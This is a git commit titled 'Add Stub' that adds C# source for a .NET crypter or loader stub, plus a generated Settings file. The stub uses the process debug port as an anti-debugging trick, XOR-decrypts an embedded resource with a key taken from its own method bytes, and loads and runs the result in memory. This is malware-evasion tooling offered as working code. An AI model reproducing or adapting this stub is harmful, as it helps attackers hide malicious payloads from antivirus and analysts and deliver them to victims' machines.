a1ffab009febae5272a5797ce0971909a8f5d90e
Desec <happy123yuan00@aliyun.com>
2022-02-22 19:51:10 +0800

    Add
    Stub

---
+++ rosee/ROSED/Properties/Settings.Designer.cs
@@ -0,0 +1,26 @@
+﻿using System;
+using System.CodeDom.Compiler;
+using System.Configuration;
+using System.Runtime.CompilerServices;
+
+namespace ROSED.Properties
+{
+	// Token: 0x02000004 RID: 4
+	[CompilerGenerated]
+	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "14.0.0.0")]
+	internal sealed partial class Settings : ApplicationSettingsBase
+	{
+		// Token: 0x17000003 RID: 3
+		// (get) Token: 0x06000009 RID: 9 RVA: 0x000022B4 File Offset: 0x000004B4
+		public static Settings Default
+		{
+			get
+			{
+				return Settings.defaultInstance;
+			}
+		}
+
+		// Token: 0x04000003 RID: 3
+		private static Settings defaultInstance = (Settings)SettingsBase.Synchronized(new Settings());
+	}
+}
---
+++ rosee/ROSED/xROSED.cs
@@ -0,0 +1,67 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.IO.Compression;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+namespace ROSED
+{
+
+	internal static class xROSED
+	{
+
+		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
+		public static extern int NtQueryInformationProcess([In] IntPtr ProcessHandle, [In] int ProcessInformationClass, out IntPtr ProcessInformation, [In] int ProcessInformationLength, [Optional] out int ReturnLength);
+
+
+		[STAThread]
+		private static void Main()
+		{
+			IntPtr structure = new IntPtr(0);
+			Module module = new StackTrace().GetFrame(0).GetMethod().Module;
+			int num;
+			xROSED.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out structure, Marshal.SizeOf<IntPtr>(structure), out num);
+			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("xROSE");
+			byte[] array = new byte[manifestResourceStream.Length + (long)structure.ToInt32()];
+			manifestResourceStream.Read(array, structure.ToInt32(), array.Length + structure.ToInt32());
+			xROSED.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out structure, Marshal.SizeOf<IntPtr>(structure), out num);
+			byte[] ilasByteArray = module.Assembly.ManifestModule.ResolveMethod(123456789 + structure.ToInt32()).GetMethodBody().GetILAsByteArray();
+			array = xROSED.xROSER(array, ilasByteArray);
+			Assembly assembly = Assembly.Load(array);
+			xROSED.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out structure, Marshal.SizeOf<IntPtr>(structure), out num);
+			MethodInfo entryPoint = assembly.EntryPoint;
+			object obj = assembly.CreateInstance(entryPoint.ToString());
+			entryPoint.Invoke(obj, null);
+		}
+
+
+		public static byte[] xROSER(byte[] plain, byte[] Key)
+		{
+			for (int i = 0; i < 5; i++)
+			{
+				for (int j = 0; j < plain.Length; j++)
+				{
+					plain[j] ^= Key[j % Key.Length];
+					for (int k = 0; k < Key.Length; k++)
+					{
+						plain[j] = (byte)((int)plain[j] ^ ((int)Key[k] << i ^ k) + j);
+					}
+				}
+			}
+			return plain;
+		}
+
+
+		public static byte[] XROSET(byte[] data)
+		{
+			MemoryStream stream = new MemoryStream(data);
+			MemoryStream memoryStream = new MemoryStream();
+			using (DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress))
+			{
+				deflateStream.CopyTo(memoryStream);
+			}
+			return memoryStream.ToArray();
+		}
+	}
+}
